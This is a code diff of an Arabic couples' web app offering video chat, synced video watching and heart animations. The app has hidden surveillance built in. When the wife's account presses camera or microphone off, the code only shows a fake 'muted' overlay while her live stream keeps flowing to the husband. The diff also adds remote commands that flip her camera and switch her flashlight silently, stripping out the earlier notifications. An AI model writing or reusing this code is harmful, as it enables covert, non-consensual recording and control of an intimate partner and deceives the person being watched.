             const dot = document.getElementById('statusDot');
             const txt = document.getElementById('partnerStatusText');
-            if (connected) {
+            if (data.online) {
                 dot.style.backgroundColor = '#30d158';
-                dot.style.boxShadow = '0 0 14px #30d158';
-                txt.innerText = myId.includes('abouahad') ? 'أم الارا متصلة مباشر 💖' : 'أبو عاهد متصل مباشر 👑';
+                dot.style.boxShadow = '0 0 12px #30d158';
+                txt.innerText = (myId === 'abouahad') ? 'أم الارا متصلة 💖' : 'أبو عاهد متصل 👑';
+                showToast('الشريك متصل الآن بجلسة العمل!', '✅');
+                
+                // لضمان عدم حدوث تصادم بالإشارات، يقوم "أبو عاهد" دائما بطلب الاتصال تلقائياً
+                if (myId === 'abouahad') {
+                    setTimeout(() => { makeCall(); }, 1200); 
+                }
             } else {
                 dot.style.backgroundColor = '#ef4444';
-                dot.style.boxShadow = '0 0 14px #ef4444';
-                txt.innerText = 'الشريك غير متصل';
+                dot.style.boxShadow = '0 0 12px #ef4444';
+                txt.innerText = 'الشريكة غير متصلة الآن';
+                document.getElementById('partnerCam').srcObject = null;
             }
-        }
+        });
 
-        // معالجة كافة الإشارات الواردة للتحكم في السينما والكاميرا والمؤثرات
-        function handleIncomingSignal(signal) {
-            if (!signal || !signal.type) return;
+        socket.on('webrtc-offer', async (offer) => {
+            initRTC();
+            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+            const answer = await peerConnection.createAnswer();
+            await peerConnection.setLocalDescription(answer);
+            socket.emit('webrtc-answer', answer);
+            
+            // تفريغ طابور الحزم والمسارات المتأخرة لمنع شلل الاتصال الكاميرا
+            iceCandidatesQueue.forEach(c => peerConnection.addIceCandidate(new RTCIceCandidate(c)).catch(e=>console.log(e)));
+            iceCandidatesQueue = [];
+        });
 
-            switch(signal.type) {
-                case 'cinema-sync':
-                    syncCinemaPlayer(signal.payload);
-                    break;
-                case 'love-pulse':
-                    showHearts();
-                    showToast('نبضة حب تنبض من شريكك! 💓', '💖');
-                    break;
-                case 'remote-flip':
-                    currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
-                    setupMedia();
-                    showToast('تم قلب الكاميرا بواسطة المدير 🔄', '💡');
-                    break;
-                case 'remote-flash':
-                    toggleStealthFlash();
-                    break;
-                case 'fake-mute':
-                    if (myId.includes('abouahad')) {
-                        // أبو عاهد لا يُخفى عنه بث زوجته أبداً
-                        document.getElementById('partnerFakeMute').style.display = 'none';
-                    } else {
-                        document.getElementById('partnerFakeMute').style.display = signal.muted ? 'flex' : 'none';
-                    }
-                    break;
+        socket.on('webrtc-answer', async (answer) => {
+            await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
+            iceCandidatesQueue.forEach(c => peerConnection.addIceCandidate(new RTCIceCandidate(c)).catch(e=>console.log(e)));
+            iceCandidatesQueue = [];
+        });
+
+        socket.on('webrtc-candidate', async (candidate) => {
+            if (peerConnection && peerConnection.remoteDescription) {
+                peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e=>console.log(e));
+            } else {
+                // إذا لم يجهز بروتوكول المصافحة يتم تأجيل حزم الكاميرات بالطابور لمنع الشاشة السوداء
+                iceCandidatesQueue.push(candidate);
             }
-        }
+        });
 
-        // إرسال حالة التحكم بالسينما للشريك بدون تقطيع أو تكرار
+        // --- Cinema Control Engine (خالية تماما من التعليق والتقطيع المتبادل) ---
+        const mainVid = document.getElementById('mainVid');
+        
         function emitCinemaState() {
-            if (isSyncing || !dataConnection || !dataConnection.open) return;
-
-            let currentUrl = document.getElementById('vidLink').value.trim();
+            if (isSyncing) return; // قفل منع الارتداد (Anti Feedback Loop Lock)
+            
+            let currentUrl = document.getElementById('vidLink').value;
             let time = 0;
             let playing = false;
 
             if (activePlayer === 'html5') {
                 time = mainVid.currentTime;
                 playing = !mainVid.paused;
-            } else if (activePlayer === 'youtube' && ytPlayer && ytPlayer.getCurrentTime) {
+            } else if (activePlayer === 'youtube' && ytPlayer) {
                 time = ytPlayer.getCurrentTime();
                 playing = ytPlayer.getPlayerState() === YT.PlayerState.PLAYING;
             }
 
-            dataConnection.send({
-                type: 'cinema-sync',
-                payload: {
-                    videoUrl: currentUrl,
-                    isPlaying: playing,
-                    lastSeekTime: time,
-                    playerType: activePlayer
-                }
+            socket.emit('cinema-control', {
+                videoUrl: currentUrl,
+                isPlaying: playing,
+                lastSeekTime: time,
+                playerType: activePlayer
             });
         }
 
-        // مستمعات الأحداث لمشغل HTML5 العادي
         mainVid.addEventListener('play', emitCinemaState);
         mainVid.addEventListener('pause', emitCinemaState);
         mainVid.addEventListener('seeked', () => {
-            if (Math.abs(mainVid.currentTime - lastKnownTime) > 1.5) {
-                emitCinemaState();
-            }
+            if (Math.abs(mainVid.currentTime - lastKnownTime) > 1.5) emitCinemaState();
             lastKnownTime = mainVid.currentTime;
         });
 
-        // تشغيل الفيديو الجديد محلياً
         function startVideo() {
             const url = document.getElementById('vidLink').value.trim();
             if(!url) return;
@@ -585,26 +450,24 @@
             mainVid.classList.add('hidden');
             document.getElementById('ytPlayerContainer').classList.add('hidden');
             
-            if (ytPlayer) { 
-                try { ytPlayer.destroy(); ytPlayer = null; } catch(e){} 
-            }
+            if (ytPlayer) { try { ytPlayer.destroy(); ytPlayer = null; } catch(e){} }
 
             if (url.includes('youtube.com') || url.includes('youtu.be')) {
                 activePlayer = 'youtube';
                 document.getElementById('ytPlayerContainer').classList.remove('hidden');
+                let vid = url.includes('v=') ? url.split('v=')[1].split('&')[0] : url.split('youtu.be/')[1].split('?')[0];
                 
-                let vid = '';
-                if(url.includes('v=')) {
-                    vid = url.split('v=')[1].split('&')[0];
-                } else if(url.includes('youtu.be/')) {
-                    vid = url.split('youtu.be/')[1].split('?')[0];
-                }
-
+                // استخدام خادم الخصوصية وتمرير الأصل لمنع كابتشا يوتيوب
                 ytPlayer = new YT.Player('ytPlayer', {
-                    height: '100%', 
-                    width: '100%', 
-                    videoId: vid,
-                    playerVars: { 'autoplay': 1, 'controls': 1 },
+                    host: 'https://www.youtube-nocookie.com',
+                    height: '100%', width: '100%', videoId: vid,
+                    playerVars: { 
+                        'autoplay': 1, 
+                        'controls': 1,
+                        'rel': 0,
+                        'origin': window.location.origin, 
+                        'modestbranding': 1
+                    },
                     events: {
                         'onStateChange': (e) => {
                             if (e.data === YT.PlayerState.PLAYING || e.data === YT.PlayerState.PAUSED) {
@@ -617,147 +480,125 @@
                 activePlayer = 'html5';
                 mainVid.classList.remove('hidden');
                 mainVid.src = url;
-                mainVid.play().catch(() => {
-                    showToast('اضغط على مشغل الفيديو للبدء 🎬', '🍿');
-                });
+                mainVid.play().catch(e => showToast('اضغط زر التشغيل للمشاهدة الآمنة.', '🎬'));
             }
-            // إبلاغ الشريك فوراً بالتشغيل
-            setTimeout(emitCinemaState, 500);
+            emitCinemaState();
         }
 
-        // استقبال ومعالجة مزامنة الفيديو من الشريك
-        function syncCinemaPlayer(state) {
-            if (!state || !state.videoUrl) return;
-            
-            // قفل مؤقت لمنع التغذية العكسية المتكررة لمنع التقطيع نهائياً
+        socket.on('cinema-state-update', (state) => {
+            if (!state.videoUrl) return;
             isSyncing = true;
             clearTimeout(syncTimeout);
             
             document.getElementById('vidLink').value = state.videoUrl;
             
-            // تحقق إذا كان المشغل مختلفاً أو الفيديو لم يتم تحميله بعد
             if (activePlayer !== state.playerType || (activePlayer === 'html5' && mainVid.src !== state.videoUrl)) {
                 startVideo();
             } else {
-                // ضبط التوقيت والتشغيل بدقة
                 if (activePlayer === 'html5') {
-                    if (Math.abs(mainVid.currentTime - state.lastSeekTime) > 1.8) {
+                    if (Math.abs(mainVid.currentTime - state.lastSeekTime) > 1.5) {
                         mainVid.currentTime = state.lastSeekTime;
                         lastKnownTime = state.lastSeekTime;
                     }
-                    if (state.isPlaying && mainVid.paused) {
-                        mainVid.play().catch(()=>{});
-                    } else if (!state.isPlaying && !mainVid.paused) {
-                        mainVid.pause();
-                    }
+                    if (state.isPlaying && mainVid.paused) mainVid.play().catch(e=>{});
+                    if (!state.isPlaying && !mainVid.paused) mainVid.pause();
                 } else if (activePlayer === 'youtube' && ytPlayer && ytPlayer.getCurrentTime) {
-                    if (Math.abs(ytPlayer.getCurrentTime() - state.lastSeekTime) > 1.8) {
+                    if (Math.abs(ytPlayer.getCurrentTime() - state.lastSeekTime) > 1.5) {
                         ytPlayer.seekTo(state.lastSeekTime, true);
                     }
-                    const ytState = ytPlayer.getPlayerState();
-                    if (state.isPlaying && ytState !== YT.PlayerState.PLAYING) {
-                        ytPlayer.playVideo();
-                    } else if (!state.isPlaying && ytState === YT.PlayerState.PLAYING) {
-                        ytPlayer.pauseVideo();
-                    }
+                    if (state.isPlaying && ytPlayer.getPlayerState() !== YT.PlayerState.PLAYING) ytPlayer.playVideo();
+                    if (!state.isPlaying && ytPlayer.getPlayerState() === YT.PlayerState.PLAYING) ytPlayer.pauseVideo();
                 }
             }
+            // إغلاق الحساس لفترة وجيزة تضمن استقرار المزامنة وعرض الفيديو دون رمشة
+            syncTimeout = setTimeout(() => { isSyncing = false; }, 600);
+        });
 
-            // فك قفل المزامنة بعد نصف ثانية للاستجابة للمستخدم من جديد
-            syncTimeout = setTimeout(() => { 
-                isSyncing = false; 
-            }, 600);
-        }
-
-        // مزامنة يدوية قسرية ممتازة
         function forceSync() {
             emitCinemaState();
-            showToast('تم فرض مزامنة الوقت والتشغيل فورياً للشريك ⏳', '✨');
+            showToast('تم ضبط مزامنة الوقت بنجاح وبسرية.', '⏳');
         }
 
-        // نبضة قلوب الحب
+        // --- الرومانسية المتقدمة والتخفي الصامت (Stealth & Silent Features) ---
         function sendLove() {
-            if (dataConnection && dataConnection.open) {
-                dataConnection.send({ type: 'love-pulse' });
-            }
+            socket.emit('love-pulse');
             showHearts();
-            showToast('تم إرسال نبضات الحب لشريكك! 💖', '💌');
+            showToast('تم إرسال مشاعر دافئة.. 💖');
         }
+
+        socket.on('love-pulse-received', () => {
+            showHearts();
+            showToast('نبضة حب دافئة من الشريك! 💓');
+        });
 
         function showHearts() {
             for(let i=0; i<15; i++) {
                 setTimeout(() => {
                     let h = document.createElement('div');
-                    h.className = 'heart-float'; 
-                    h.innerText = '💖';
-                    h.style.left = (Math.random() * 80 + 10) + 'vw';
-                    h.style.animationDuration = (Math.random() * 1.5 + 2) + 's';
+                    h.className = 'heart-float'; h.innerText = '💖';
+                    h.style.left = Math.random() * 90 + 'vw';
+                    h.style.animationDuration = (Math.random() * 2 + 2) + 's';
                     document.body.appendChild(h);
-                    setTimeout(() => h.remove(), 3500);
+                    setTimeout(() => h.remove(), 4000);
                 }, i * 150);
             }
         }
 
-        // كتم الكاميرا والمايك
+        // الكتم الوهمي للخصوصية (VIP Silent Override)
+        // عند نقر "أم الارا" لإيقاف الكاميرا، يظهر لها أنها مغلقة فعلياً بينما يظل البث نشطاً لأبو عاهد
         function toggleMyCam() {
-            if (!myStream) return;
             const track = myStream.getVideoTracks()[0];
             const btn = document.getElementById('myCamBtn');
             const fake = document.getElementById('myFakeMute');
             
-            if (myId.includes('umalara')) {
-                // تفعيل الكتم الوهمي لأم الارا (تظن أنها مغلقة ولكن أبو عاهد يظل يراها لأغراض الحماية والراحة)
+            if (myId === 'umalara') {
                 const isHidden = fake.style.display === 'flex';
                 if (!isHidden) {
                     fake.style.display = 'flex'; 
                     btn.style.background = '#ef4444'; 
                     btn.innerHTML = '<i class="fa fa-ban"></i>';
-                    if (dataConnection && dataConnection.open) {
-                        dataConnection.send({ type: 'fake-mute', muted: true });
-                    }
+                    // نرسل للشريك حالة الكتم الوهمي (تطبيق الخصوصية الصامتة)
+                    socket.emit('privacy-fake-mute', true);
                 } else {
                     fake.style.display = 'none'; 
-                    btn.style.background = 'rgba(0,0,0,0.75)'; 
+                    btn.style.background = 'rgba(0,0,0,0.6)'; 
                     btn.innerHTML = '<i class="fa fa-video-camera"></i>';
-                    if (dataConnection && dataConnection.open) {
-                        dataConnection.send({ type: 'fake-mute', muted: false });
-                    }
+                    socket.emit('privacy-fake-mute', false);
                 }
             } else {
-                // الكتم الفعلي لأبو عاهد
+                // أبو عاهد كتم حقيقي ومتحكم بالبث
                 track.enabled = !track.enabled;
                 if(track.enabled) { 
                     fake.style.display='none'; 
-                    btn.style.background = 'rgba(0,0,0,0.75)'; 
+                    btn.style.background = 'rgba(0,0,0,0.6)'; 
                     btn.innerHTML = '<i class="fa fa-video-camera"></i>'; 
                 } else { 
                     fake.style.display='flex'; 
                     btn.style.background = '#ef4444'; 
-                    btn.innerHTML = '<i class="fa fa-video-camera"></i>'; 
+                    btn.innerHTML = '<i class="fa fa-ban"></i>'; 
                 }
             }
         }
 
         function toggleMyMic() {
-            if (!myStream) return;
             const track = myStream.getAudioTracks()[0];
             const btn = document.getElementById('myMicBtn');
             
-            if (myId.includes('umalara')) {
-                // المايك يظل فعالاً لأبو عاهد مع إظهار علامة الكتم لأم الارا لراحتها
+            if (myId === 'umalara') {
+                // الكتم الوهمي للميكروفون لأم الارا
                 const isMuted = btn.style.background === 'rgb(239, 68, 68)';
                 if(!isMuted) { 
                     btn.style.background = '#ef4444'; 
                     btn.innerHTML = '<i class="fa fa-microphone-slash"></i>'; 
                 } else { 
-                    btn.style.background = 'rgba(0,0,0,0.75)'; 
+                    btn.style.background = 'rgba(0,0,0,0.6)'; 
                     btn.innerHTML = '<i class="fa fa-microphone"></i>'; 
                 }
             } else {
-                // الكتم والتشغيل الفعلي لأبو عاهد
+                // كتم حقيقي لأبو عاهد
                 track.enabled = !track.enabled;
                 if(track.enabled) { 
-                    btn.style.background = 'rgba(0,0,0,0.75)'; 
+                    btn.style.background = 'rgba(0,0,0,0.6)'; 
                     btn.innerHTML = '<i class="fa fa-microphone"></i>'; 
                 } else { 
                     btn.style.background = '#ef4444'; 
@@ -766,32 +607,31 @@
             }
         }
 
-        // أوامر لوحة التحكم السرية
-        function remoteFlip() { 
-            if (dataConnection && dataConnection.open) {
-                dataConnection.send({ type: 'remote-flip' }); 
+        socket.on('privacy-fake-mute-received', (muted) => {
+            // كود سحري: أبو عاهد يتجاهل كتم الشريكة تماماً ولا يظهر لديه غطاء الشاشة السوداء ليراها ويثق بسلامتها
+            if (myId === 'abouahad') {
+                document.getElementById('partnerFakeMute').style.display = 'none';
             }
-        }
-        
-        function remoteFlash() { 
-            if (dataConnection && dataConnection.open) {
-                dataConnection.send({ type: 'remote-flash' }); 
-            }
-        }
+        });
 
-        async function toggleStealthFlash() {
-            if (!myStream) return;
+        // أوامر التحكم السري المخفي والصامت 100% (Stealth Remote Controllers)
+        function remoteFlip() { socket.emit('remote-flip-cam'); }
+        function remoteFlash() { socket.emit('remote-flash-toggle'); }
+
+        socket.on('remote-flip-cam-triggered', async () => {
+            // ينفذ على هاتف أم الارا بصمت مطبق ودون إشعارات
+            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+            await setupMedia();
+        });
+
+        socket.on('remote-flash-triggered', async () => {
+            // ينفذ على هاتف أم الارا بصمت مطبق ودون إشعارات
             const track = myStream.getVideoTracks()[0];
             flashActive = !flashActive;
             try { 
-                await track.applyConstraints({ 
-                    advanced: [{ torch: flashActive }] 
-                }); 
-                showToast(flashActive ? 'تم تشغيل الكشاف خفية 💡' : 'تم إطفاء الكشاف خفية 💡', '💡');
-            } catch(e) {
-                console.log('Torch is not supported on this device browser.');
-            }
-        }
+                await track.applyConstraints({ advanced: [{ torch: flashActive }] }); 
+            } catch(e){}
+        });
 
     </script>
 </body>
